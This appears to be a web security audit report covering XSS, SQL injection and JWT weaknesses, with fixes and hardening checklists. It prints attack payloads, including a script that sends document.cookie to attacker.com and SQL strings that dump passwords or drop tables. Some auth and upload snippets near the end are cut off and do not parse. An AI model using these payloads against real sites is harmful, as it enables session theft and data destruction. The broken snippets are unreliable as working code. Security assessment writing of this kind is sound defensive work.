### [VULN-001] — Cross-Site Scripting (XSS)

| Field | Detail |
|---|---|
| **Severity** | 🔴 Critical |
| **CWE** | CWE-79 |
| **OWASP Category** | A03:2021 – Injection |
| **Affected Component** | `/search?q=` parameter |

#### Description
Reflected XSS via unsanitized user input rendered in DOM.

#### Exploitation Steps
1. Navigate to `https://example.com/search?q=<script>alert(1)</script>`
2. Observe JavaScript execution in browser.

#### Payload Example
```
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror=alert(document.domain)>
"><svg onload=alert(1)>
```

#### Proof of Concept
```
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: example.com
```

#### Real-World Impact
Session hijacking, credential theft, malware delivery, full account takeover.

#### Recommended Fix
```javascript
// ❌ Vulnerable
element.innerHTML = userInput;

// ✅ Secure
element.textContent = userInput;
// OR use DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### Prevention Strategy
- Implement Content Security Policy (CSP)
- Use framework-native escaping (React JSX auto-escapes)
- Never use `dangerouslySetInnerHTML` without sanitization
- Validate and encode all user inputs

### [VULN-002] — SQL Injection

| Field | Detail |
|---|---|
| **Severity** | 🔴 Critical |
| **CWE** | CWE-89 |
| **OWASP Category** | A03:2021 – Injection |
| **Affected Component** | `/api/users?id=` |

#### Description
Unsanitized user input passed directly to SQL query.

#### Exploitation Steps
1. Send: `GET /api/users?id=1 OR 1=1--`
2. All user records returned.
3. Use `UNION SELECT` to extract database structure.

#### Payload Example
```sql
' OR '1'='1
1; DROP TABLE users--
1 UNION SELECT username, password FROM users--
admin'--
```

#### Recommended Fix
```javascript
// ❌ Vulnerable
const query = `SELECT * FROM users WHERE id = ${req.params.id}`;

// ✅ Secure — Use Parameterized Queries
const query = 'SELECT * FROM users WHERE id = ?';
db.execute(query, [req.params.id]);

// ✅ ORM approach (Prisma)
const user = await prisma.user.findUnique({ where: { id: parseInt(id) } });
```

### [VULN-004] — JWT Weaknesses

| Field | Detail |
|---|---|
| **Severity** | 🟠 High |
| **CWE** | CWE-347 |
| **OWASP Category** | A07:2021 – Identification and Authentication Failures |
| **Affected Component** | Authentication API |

#### Common Issues
- Algorithm confusion (`alg: none` bypass)
- Weak secret key (`secret`, `password`, `123456`)
- No expiry (`exp` claim missing)
- Token stored in `localStorage` (XSS risk)

#### Recommended Fix
```javascript
// ✅ Secure JWT implementation
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,  // Strong 256-bit random secret
  {
    algorithm: 'HS256',
    expiresIn: '15m',       // Short-lived access token
    issuer: 'yourapp.com'
  }
);

// ✅ Store in httpOnly cookie (not localStorage)
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict',
  maxAge: 15 * 60 * 1000
});
```

### Secure Auth Implementation

```javascript
// ✅ Complete secure auth flow

// Registration
const hashedPassword = await bcrypt.hash(password, 12);

// Login — constant-time comparison
const valid = await bcrypt.compare(inputPassword, storedHash);
if (!valid) {
  await incrementFailedAttempts(userId);
  return res.status(401).json({ error: 'Invalid credentials' });
```

```javascript
const upload = multer({
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max

    const allowed = ['image/jpeg', 'image/png', 'application/pdf'];
    cb(null, allowed.includes(file.mimetype));
  }

app.use((req, res, next) => {

});

const helmet = require('helmet');
```

## 9. Secure Architecture Recommendations

### Zero Trust Architecture

```
┌─────────────────────────────────────────────────────┐
│                   ZERO TRUST MODEL                  │
├─────────────┬───────────────────────┬───────────────┤
│   Identity  │      Device           │    Network    │
│─────────────│───────────────────────│───────────────│
│ MFA Always  │ Device Posture Check  │ Microsegment  │
│ JWT + RBAC  │ Endpoint Detection    │ mTLS Between  │
│ Least Priv  │ Patch Compliance      │ Services      │
└─────────────┴───────────────────────┴───────────────┘
```

### Defense-in-Depth Strategy

```
Layer 1: Network       → Firewall, WAF, DDoS Protection (Cloudflare)
Layer 2: DNS           → DNSSEC, CAA Records
Layer 3: TLS           → TLS 1.3, HSTS Preload, OCSP Stapling
Layer 4: Application   → Input Validation, Output Encoding, CSP
Layer 5: Authentication → MFA, Strong Passwords, Argon2
Layer 6: Authorization  → RBAC, Least Privilege, ABAC
Layer 7: Data          → Encryption at rest (AES-256), in transit
Layer 8: Monitoring    → SIEM, Anomaly Detection, Audit Logs
Layer 9: Incident Resp → Playbooks, Backup, Recovery Plan
```

### Secure Deployment Checklist

```yaml
# Production Security Checklist
security:
  headers:
    - HSTS with preload
    - CSP with nonce
    - X-Frame-Options: DENY
    - X-Content-Type-Options: nosniff
  
  authentication:
    - Passwords: Argon2id or bcrypt (cost ≥ 12)
    - Sessions: 15-min access token, 7-day refresh
    - MFA: TOTP or WebAuthn
    - Account lockout: 5 failures → 15 min lock
  
  api:
    - Rate limiting on all endpoints
    - Request size limits (10KB body)
    - Input validation (Zod / Joi)
    - Output sanitization
  
  secrets:
    - No hardcoded secrets in code
    - Use Vault / AWS Secrets Manager
    - Rotate all keys quarterly
    - Scan with truffleHog, gitleaks
  
  dependencies:
    - npm audit in CI/CD pipeline
    - Snyk integration
    - Dependabot enabled
    - Lock file committed
  
  monitoring:
    - Error tracking (Sentry)
    - Access logging (ELK Stack)
    - Uptime monitoring
    - Security alerting
```
